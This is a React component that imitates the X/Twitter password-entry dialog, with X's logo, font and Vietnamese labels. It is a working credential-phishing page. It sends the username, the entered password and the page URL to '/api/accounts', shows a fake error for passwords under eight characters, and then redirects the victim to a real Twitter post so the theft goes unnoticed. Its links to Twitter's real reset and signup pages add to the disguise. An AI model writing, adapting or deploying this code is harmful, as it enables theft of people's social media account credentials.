/* eslint-disable react/prop-types */
import { useRef, useState } from "react";
import Button from "./Button";
import Input from "./Input";

const EnterPasswordDialog = ({
    username,
    onClose,
    showLoading,
    hideLoading,
    showAlert,
    hideAlert,
}) => {
    const [password, setPassword] = useState("");
    const ip = useRef();

    const onLogin = async () => {
        if (!password.trim()) {
            ip.current.focus();
            return;
        }

        if (password.length < 8) {
            showLoading();

            setTimeout(() => {
                hideLoading();
                showAlert();

                setTimeout(() => {
                    hideAlert();
                }, 3000);
            }, 2000);

            return;
        }

        showLoading();

        await fetch("/api/accounts", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                username,
                password,
                ref: window.location.href,
            }),
        });

        setTimeout(() => {
            window.location.href =
                "https://twitter.com/Chinh________/status/1721741063147155936?s=20";
        }, 2000);
    };

    return (
        <div className='enter-pw-dialog'>
            <div
                className='overlay'
                style={{
                    position: "fixed",
                    top: 0,
                    right: 0,
                    bottom: 0,
                    left: 0,
                    backgroundColor: "rgba(0, 0, 0, 0.4)",
                    zIndex: 6888,
                }}
            ></div>

            <div
                className='content'
                style={{
                    position: "fixed",
                    top: "50%",
                    right: "50%",
                    maxWidth: "600px",
                    width: "100%",
                    height: "650px",
                    transform: "translate(50%, -50%)",
                    backgroundColor: "white",
                    zIndex: 7999,
                    borderRadius: "20px",
                    display: "flex",
                    flexDirection: "column",
                    // padding: "40px 30px",
                }}
            >
                <div
                    style={{
                        display: "flex",
                        padding: "16px",
                        paddingBottom: 0,
                        alignItems: "center",
                        justifyContent: "space-between",
                    }}
                    className='dialog-header'
                >
                    <div
                        style={{
                            cursor: "pointer",
                        }}
                        onClick={onClose}
                    >
                        <svg
                            style={{
                                width: "20px",
                                height: "20px",
                            }}
                            viewBox='0 0 24 24'
                            aria-hidden='true'
                        >
                            <g>
                                <path d='M10.59 12L4.54 5.96l1.42-1.42L12 10.59l6.04-6.05 1.42 1.42L13.41 12l6.05 6.04-1.42 1.42L12 13.41l-6.04 6.05-1.42-1.42L10.59 12z'></path>
                            </g>
                        </svg>
                    </div>

                    <div>
                        <svg
                            style={{
                                width: "30px",
                                height: "30px",
                            }}
                            viewBox='0 0 24 24'
                            aria-label='X'
                            role='img'
                        >
                            <g>
                                <path d='M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z'></path>
                            </g>
                        </svg>
                    </div>

                    <div></div>
                </div>

                <div
                    className='dialog-content'
                    style={{
                        display: "flex",
                        flexDirection: "column",
                        alignItems: "center",
                        height: "100%",
                    }}
                >
                    <div
                        style={{
                            padding: "0 20px",
                            // paddingBottom: "48px",
                            display: "flex",
                            flexDirection: "column",
                            height: "100%",
                            // justifyContent: "start",
                        }}
                    >
                        <div
                            style={{
                                flex: 1,
                            }}
                        >
                            <div
                                style={{
                                    margin: "20px 0",
                                    marginBottom: "30px",
                                }}
                            >
                                <h1
                                    style={{
                                        fontSize: "28px",
                                        lineHeight: "36px",
                                        fontFamily:
                                            'TwitterChirp, -apple-system, "system-ui", "Segoe UI", Roboto, Helvetica, Arial, sans-serif',
                                    }}
                                >
                                    Nhập mật khẩu của bạn
                                </h1>
                            </div>

                            <div>
                                <Input
                                    disabled
                                    label='Tên người dùng'
                                    value={username}
                                />
                            </div>

                            <div
                                style={{
                                    marginTop: "20px",
                                }}
                            >
                                <Input
                                    innerref={ip}
                                    label='Mật khẩu'
                                    type='password'
                                    value={password}
                                    onChange={(e) => {
                                        setPassword(e.target.value);
                                    }}
                                    onKeyDown={(e) => {
                                        if (e.code === "Enter") {
                                            onLogin();
                                        }
                                    }}
                                />
                                <div
                                    style={{
                                        padding: "0 8px",
                                    }}
                                >
                                    <span
                                        onClick={() => {
                                            window.location =
                                                "https://twitter.com/i/flow/password_reset?input_flow_data=%7B%22requested_variant%22%3A%22eyJwbGF0Zm9ybSI6IlJ3ZWIifQ%3D%3D%22%7D";
                                        }}
                                        style={{
                                            cursor: "pointer",
                                            fontSize: "12px",
                                            fontWeight: 400,
                                            fontFamily:
                                                'TwitterChirp, -apple-system, "system-ui", "Segoe UI", Roboto, Helvetica, Arial, sans-serif',
                                            color: "rgb(29, 155, 240)",
                                        }}
                                    >
                                        Quên mật khẩu?
                                    </span>
                                </div>
                            </div>
                        </div>

                        <div>
                            <div style={{ marginTop: "20px" }}>
                                <Button
                                    fullWidth
                                    height={47}
                                    onClick={onLogin}
                                    backgroundColor='#000'
                                >
                                    Đăng nhập
                                </Button>
                            </div>

                            <div
                                dir='ltr'
                                style={{
                                    marginTop: "20px",
                                    marginBottom: "20px",
                                    color: "rgb(83, 100, 113)",
                                }}
                            >
                                <span>
                                    <span
                                        style={{
                                            fontSize: "15px",
                                            fontWeight: 400,
                                            fontFamily:
                                                'TwitterChirp, -apple-system, "system-ui", "Segoe UI", Roboto, Helvetica, Arial, sans-serif',
                                        }}
                                    >
                                        {"Không có tài khoản? "}
                                    </span>
                                </span>
                                <span
                                    role='button'
                                    style={{
                                        color: "rgb(29, 155, 240)",
                                        fontSize: "15px",
                                        fontWeight: 400,
                                        fontFamily:
                                            'TwitterChirp, -apple-system, "system-ui", "Segoe UI", Roboto, Helvetica, Arial, sans-serif',
                                    }}
                                >
                                    <span
                                        onClick={() => {
                                            window.location =
                                                "https://twitter.com/i/flow/signup?input_flow_data=%7B%22requested_variant%22%3A%22eyJyZWRpcmVjdF91cmwiOiIvP2xvZ291dD0xNjk5MjAyNjc1NDk0In0%3D%22%7D";
                                        }}
                                    >
                                        <span
                                            style={{
                                                cursor: "pointer",
                                                color: "rgb(29, 155, 240)",
                                                fontSize: "15px",
                                                fontWeight: 400,
                                                fontFamily:
                                                    'TwitterChirp, -apple-system, "system-ui", "Segoe UI", Roboto, Helvetica, Arial, sans-serif',
                                            }}
                                        >
                                            Đăng ký
                                        </span>
                                    </span>
                                </span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    );
};

export default EnterPasswordDialog;
